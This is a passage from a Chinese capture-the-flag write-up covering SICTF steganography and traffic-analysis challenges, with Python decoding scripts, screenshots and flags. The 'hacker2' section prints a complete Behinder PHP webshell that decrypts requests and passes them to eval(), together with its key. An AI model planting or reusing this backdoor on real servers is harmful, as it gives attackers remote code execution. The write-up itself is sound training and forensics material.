class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;secret~.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().splitlines()[:-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">img = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    bgr = [base64.b64decode(i[::-<span class="number">1</span>]).decode() <span class="keyword">for</span> i <span class="keyword">in</span> line.split(<span class="string">&quot; &quot;</span>)][::-<span class="number">1</span>]</span><br><span class="line">    img.append(bgr)</span><br><span class="line">img = np.array(img, np.uint8)</span><br><span class="line"></span><br><span class="line">dic = &#123;<span class="number">1</span>: <span class="number">268780</span>, <span class="number">2</span>: <span class="number">134390</span>, <span class="number">4</span>: <span class="number">67195</span>, <span class="number">5</span>: <span class="number">53756</span>, <span class="number">10</span>: <span class="number">26878</span>, <span class="number">20</span>: <span class="number">13439</span>, <span class="number">89</span>: <span class="number">3020</span>, <span class="number">151</span>: <span class="number">1780</span>, <span class="number">178</span>: <span class="number">1510</span>, <span class="number">302</span>: <span class="number">890</span>, <span class="number">356</span>: <span class="number">755</span>, <span class="number">445</span>: <span class="number">604</span>, <span class="number">604</span>: <span class="number">445</span>, <span class="number">755</span>: <span class="number">356</span>, <span class="number">890</span>: <span class="number">302</span>, <span class="number">1510</span>: <span class="number">178</span>, <span class="number">1780</span>: <span class="number">151</span>, <span class="number">3020</span>: <span class="number">89</span>, <span class="number">13439</span>: <span class="number">20</span>, <span class="number">26878</span>: <span class="number">10</span>, <span class="number">53756</span>: <span class="number">5</span>, <span class="number">67195</span>: <span class="number">4</span>, <span class="number">134390</span>: <span class="number">2</span>&#125;</span><br><span class="line"><span class="keyword">for</span> height, width <span class="keyword">in</span> dic.items():</span><br><span class="line">    cv2.imwrite(<span class="string">f&quot;./out/<span class="subst">&#123;height&#125;</span>_<span class="subst">&#123;width&#125;</span>.png&quot;</span>, img.reshape(height, width, <span class="number">3</span>))</span><br></pre></td></tr></table></figure><ol start="4"><li>在 <code>out目录里面</code> 我们得到了一张图片</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202023063.png" alt="image-20230117202023063"></p><p>很明显是歪的，向右旋转90°就正常了。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202056006.png" alt="image-20230117202056006"></p><p>明显能看到有两个人的感觉，而且大的这个女生就是我们的<code>f1ag.png</code></p><ol start="5"><li>我这边是非常规解，正常的话，是要把这个过程逆过来，但是中间xor太多了，使用<code>Stegsolve</code>对<code>f1ag.png</code>和上面的图片进行xor后得到下面的图片（注意：我第一次没有得到这个图片，然后我给上面的图片水平翻转了一下就得到了清晰的图片了）</li></ol><p>为什么需要向右旋转90°和水平翻转是因为我是 <code>列优先</code> 生成的图片，但是出题人是<code>行优先</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117201817258.png" alt="image-20230117201817258"></p><p>使用识图工具就好了，我这边用的插件。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202441091.png" alt="image-20230117202441091"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202504170.png" alt="image-20230117202504170"></p><p>所以这个角色叫<code>小鸟游六花</code>，拼音是<code>xiaoniaoyouliuhua</code>，为什么我知道是拼音是根据<code>hint.txt</code>，再加上<code>f1ag.png</code>被隐写工具隐写了。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202545962.png" alt="image-20230117202545962"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202642642.png" alt="image-20230117202642642"></p><p>png和jpg特征一样</p><ol start="6"><li>使用<code>OurSecret</code>解密，得到<code>flag.txt</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202732071.png" alt="image-20230117202732071"></p><p><strong>SICTF{3d04cd71-5b2d-4bce-abec-a6f2f95c3665}</strong></p><h3 id="补充：-1"><a href="#补充：-1" class="headerlink" title="补充："></a><strong>补充：</strong></h3><p>这个题目不知道怎么评价，因为他的出题的那个脚本，我把逆代码写出来后还是得不到清楚的图片，因为我已经做出来了，就找树木反应，树木给了正确解题代码，然后拿到正确解题代码</p><p><strong>出题人的解题脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode,b64decode</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">Dir=<span class="string">&#x27;f1ag.png&#x27;</span></span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(Dir)</span><br><span class="line"></span><br><span class="line">x=<span class="number">604</span></span><br><span class="line">y=<span class="number">445</span></span><br><span class="line">printf = Image.new(<span class="string">&quot;RGB&quot;</span>, (x, y))</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;secret~.txt&#x27;</span>) </span><br><span class="line">rgb_im = im.convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">        line = file.readline()</span><br><span class="line">        rgb = line.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        R = rgb[<span class="number">0</span>]</span><br><span class="line">        R = R[::-<span class="number">1</span>]</span><br><span class="line">        R = b64decode(R)</span><br><span class="line">        R = <span class="built_in">int</span>(R)</span><br><span class="line">        G = rgb[<span class="number">1</span>]</span><br><span class="line">        G = G[::-<span class="number">1</span>]</span><br><span class="line">        G = b64decode(G)</span><br><span class="line">        G = <span class="built_in">int</span>(G)</span><br><span class="line">        B = rgb[<span class="number">2</span>]</span><br><span class="line">        B = B[::-<span class="number">1</span>]</span><br><span class="line">        B = b64decode(B)</span><br><span class="line">        B = <span class="built_in">int</span>(B)</span><br><span class="line">        <span class="keyword">if</span>(R == <span class="number">255</span>):</span><br><span class="line">            R == <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span>(G == <span class="number">255</span>):</span><br><span class="line">            G = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span>(B == <span class="number">255</span>):</span><br><span class="line">            B = <span class="number">0</span></span><br><span class="line">        r, g, b = rgb_im.getpixel((i, j))</span><br><span class="line">        out1 = r ^ R </span><br><span class="line">        out2 = g ^ G </span><br><span class="line">        out3 = b ^ B</span><br><span class="line">        printf.putpixel((i, j), (<span class="built_in">int</span>(out3), <span class="built_in">int</span>(out1), <span class="built_in">int</span>(out2)))</span><br><span class="line">printf.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>如果你看了一下上面的代码，出题人的解题代码只是简单的xor和黑色变成白色（所以就出现了 <code>stegslove</code> 非预期解的情况）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我再来解释一下，我不确定（强调一下我不确定！！！）</span><br><span class="line">但是大概率是，出题人的加密脚本，本意是两个图片的像素值互换位置，然后再xor</span><br><span class="line">首先互换位置不影响xor，但是由于他xor太多了，自己给自己搞晕了，哈哈哈~</span><br><span class="line">然后题目出后，自己没有去尝试，然后就导致出现了，你就算把逆脚本写出来，也得不到很清楚的图片</span><br><span class="line"></span><br><span class="line">大佬们，如果不对欢迎联系我，单杀我，哈哈哈！</span><br></pre></td></tr></table></figure><br><h2 id="6-F-hacker2"><a href="#6-F-hacker2" class="headerlink" title="6. F | hacker2 |"></a>6. F | hacker2 |</h2><p><strong>题目描述：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">树木不小心把重要的信息放在了自己的shell当中，或许对你的解密会有帮助</span><br></pre></td></tr></table></figure><ol><li>先过滤http流，看到了一个信息，一个php代码，感觉很有用处，首先我这个时候并不知道冰蝎流量，然后我看见这个后，我就ctrl+shift+o，给他保存下来了。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202919823.png" alt="image-20230117202919823"></p><ol start="2"><li>代码如下，后面经过了解知道是冰蝎后，key很有用处，他是AES的key，也就是说key是<code>7d7c23e87b47368b</code></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;7d7c23e87b47368b&quot;</span>; <span class="comment">//0123456789abcdef</span></span><br><span class="line"> <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line"> <span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">  <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">       &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">  <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line"> &#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>过滤器改为<code>http &amp;&amp; data-text-lines</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202959089.png" alt="image-20230117202959089"></p><ol start="4"><li>将89序号后的http流下面的base64字符串全部复制粘贴到了txt中</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117203021986.png" alt="image-20230117203021986"></p><p>如图：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117203033043.png" alt="image-20230117203033043"></p><ol start="5"><li>一个一个的解，我先解了一下，解到了大base64就卡住了，我就从小base64开始。(补充说了解决大base64卡住的问题)</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117203047659.png" alt="image-20230117203047659"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117203059305.png" alt="image-20230117203059305"></p><p>c0rRect!!!，英文翻译过来就是正确的意思。</p><ol start="6"><li>再根据<code>describe.txt</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">大黑客树木再次上传了shell并用工具进行连接，他在上传目录的一堆测试txt中找到了重要的字符串，我们观察并截取了流量</span><br><span class="line">你能告诉我们他上传的shell的名称和key值以及最终找到的重要字符串吗？</span><br><span class="line">flag格式：SICTF&#123;shell名称_密钥_文本文件中存储的字符串&#125;</span><br></pre></td></tr></table></figure><p><strong>SICTF{she1l_7d7c23e87b47368b_c0rRect!!!}</strong></p><h3 id="补充：-2"><a href="#补充：-2" class="headerlink" title="补充："></a><strong>补充：</strong></h3><p>也可以不用去下载冰蝎V2工具，因为大的文本，这个工具会卡住，但是下面的方法不会卡住，只能说<code>CyberChef, YYDS!!!</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117203426505.png" alt="image-20230117203426505"></p><p>先Base64解码，然后Aes解密，Key为<code>7d7c23e87b47368b</code>，IV为<code>0000000000000000000000000000000</code>，Mode为<code>CBC</code></p><br><h2 id="7-F3-王八树木"><a href="#7-F3-王八树木" class="headerlink" title="7. F3 | 王八树木 |"></a>7. F3 | 王八树木 |</h2><p><strong>题目描述：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">树木就是个王八（doge）</span><br></pre></td></tr></table></figure><p><strong>解题思路：</strong></p><p>明明能拿一血，气死了，卡猫脸变化半天，因为我自己的猫脸变化代码不对，最后非常规拿个三血</p><ol><li><code>010editor</code> 打开<code>树木</code>，尾部一眼JPG，你们自己找个脚本了，我用的也是脚本</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118144525245.png" alt="image-20230118144525245"></p><ol start="2"><li>仔细看图片，看到这个小圆圈了没，不说百分百，大概率<code>silenteye</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118144648500.png" alt="image-20230118144648500"></p><ol start="3"><li>将这个图片尾部的pkzip拿出来，里面是<code>pass.txt</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118144755803.png" alt="image-20230118144755803"></p><p>爆破密码为<code>123456</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118144921993.png" alt="image-20230118144921993"></p><ol start="4"><li>打开<code>pass.txt</code>，密码为<code>SI!!!!!!</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118144931511.png" alt="image-20230118144931511"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118145011663.png" alt="image-20230118145011663"></p><ol start="5"><li>保存<code>参数.txt</code>，打开是<code>2, 1, 2</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118145028732.png" alt="image-20230118145028732"></p><ol start="6"><li>下面是<code>flag.bmp</code>，一眼猫脸变化，但是我的猫脸变化代码不对，只有2个参数，我就去找代码了，找了半天没找到，于是选择用我目前的代码选择爆破</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118145057546.png" alt="image-20230118145057546"></p><ol start="7"><li>爆破了很多</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118145234889.png" alt="image-20230118145234889"></p><p>当a&#x3D;1，b&#x3D;3的时候，可以明显看到，基本能看到SIC，我们是SICTF，所以就能慢慢拿到flag</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118145259991.png" alt="image-20230118145259991"></p><p>这是如何看的示例</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118145453051.png" alt="image-20230118145453051"></p><p><strong>SICTF{a9549c89-d261-4bd7-9643-60874dbd28b8}</strong></p><h3 id="补充：-3"><a href="#补充：-3" class="headerlink" title="补充："></a><strong>补充：</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>, choices=[<span class="string">&quot;encode&quot;</span>, <span class="string">&quot;decode&quot;</span>],</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;encode | decode&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入文件名称&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-n&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1</span>, required=<span class="literal">False</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入参数n&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-a&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入参数a&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-b&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入参数b&#x27;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold</span>(<span class="params">img, a, b</span>):</span><br><span class="line">    new_img = np.zeros((r, c, <span class="number">3</span>), np.uint8)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(c):</span><br><span class="line">                x = (i + b * j) % r</span><br><span class="line">                y = (a * i + (a * b + <span class="number">1</span>) * j) % c</span><br><span class="line">                new_img[x, y] = img[i, j]</span><br><span class="line">        img = np.copy(new_img)</span><br><span class="line">    <span class="keyword">return</span> new_img</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dearnold</span>(<span class="params">img, n, a, b</span>):</span><br><span class="line">    new_img = np.zeros((r, c, <span class="number">3</span>), np.uint8)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(c):</span><br><span class="line">                x = ((a * b + <span class="number">1</span>) * i - b * j) % r</span><br><span class="line">                y = (-a * i + j) % c</span><br><span class="line">                new_img[x, y] = img[i, j]</span><br><span class="line">        img = np.copy(new_img)</span><br><span class="line">    <span class="keyword">return</span> new_img</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    img_path = os.path.abspath(args.f)</span><br><span class="line">    file_name = os.path.splitext(img_path)[<span class="number">0</span>].split(<span class="string">&quot;\\&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line">    img = np.array(Image.<span class="built_in">open</span>(img_path), np.uint8)[:,:,::-<span class="number">1</span>]</span><br><span class="line">    r, c = img.shape[:<span class="number">2</span>]</span><br><span class="line">    n, a, b = args.n, args.a, args.b</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.t == <span class="string">&quot;encode&quot;</span>:</span><br><span class="line">        new_img = arnold(img, a, b)</span><br><span class="line">    <span class="keyword">elif</span> args.t == <span class="string">&quot;decode&quot;</span>:</span><br><span class="line">        new_img = dearnold(img, n, a, b)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 图片宽高不一致, 无法进行猫脸变化!&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    cv2.imwrite(<span class="string">f&quot;./<span class="subst">&#123;file_name&#125;</span>_<span class="subst">&#123;n&#125;</span>_<span class="subst">&#123;a&#125;</span>_<span class="subst">&#123;b&#125;</span>.png&quot;</span>, new_img)</span><br></pre></td></tr></table></figure><p>命令：<code>python .\main.py -t decode -f .\flag.bmp -n 2 -a 1 -b 2</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118172859143.png" alt="image-20230118172859143"></p><br><h2 id="8-F2-Revenge"><a href="#8-F2-Revenge" class="headerlink" title="8. F2 | Revenge |"></a>8. F2 | Revenge |</h2><p><strong>题目描述：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可爱的小猫给你发送了一张图片，并说一定要留意这张图片。</span><br></pre></td></tr></table></figure><p><strong>解题思路：</strong></p><p>轻松拿了个二血，也不错了</p><ol><li>使用<code>zsteg</code>看一下图片，得到<code>Password:SICTF&#123;this_1s_f1ag&#125;</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230119132700798.png" alt="image-20230119132700798"></p><ol start="2"><li>解压zip，得到了<code>key.pyc</code>，使用<code>uncompyle6</code>，逆向一下pyc</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.8.0</span></span><br><span class="line"><span class="comment"># Python bytecode 3.7.0 (3394)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.8 (tags/v3.8.8:024d805, Feb 19 2021, 13:18:16) [MSC v.1928 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: encode.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2023-01-17 14:47:26</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 439 bytes</span></span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line">Hg = np.float32(cv2.imread(<span class="string">&#x27;flag.png&#x27;</span>, <span class="number">1</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        Si = randint(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">        Fe = Hg[:, :, Si]</span><br><span class="line">        Mg = cv2.dct(Fe[<span class="number">8</span> * i:<span class="number">8</span> * i + <span class="number">8</span>, <span class="number">8</span> * j:<span class="number">8</span> * j + <span class="number">8</span>])</span><br><span class="line">        <span class="keyword">if</span> secret[(i * <span class="number">64</span> + j)] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            Mg[(<span class="number">7</span>, <span class="number">7</span>)] = <span class="number">20</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> secret[(i * <span class="number">64</span> + j)] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                Mg[(<span class="number">7</span>, <span class="number">7</span>)] = -<span class="number">20</span></span><br><span class="line">        Fe[<span class="number">8</span> * i:<span class="number">8</span> * i + <span class="number">8</span>, <span class="number">8</span> * j:<span class="number">8</span> * j + <span class="number">8</span>] = cv2.idct(Mg)</span><br><span class="line">        Hg[:, :, Si] = Fe</span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">&#x27;flag.png&#x27;</span>, Hg)</span><br><span class="line"><span class="comment"># okay decompiling .\key.pyc</span></span><br></pre></td></tr></table></figure><ol start="3"><li>代码大概意思就是用得到dct，我也不太懂，但是我就知道是8x8的图片范围做<code>cv2.dct</code>，然后如果secret的第一字节是<code>1</code>那<code>cv2.dct</code>后的shape是8x8，然后第8行第8列，也就是最后一行最后一列，变成20</li></ol><p>注意：这个题目他用了一个randit(0, 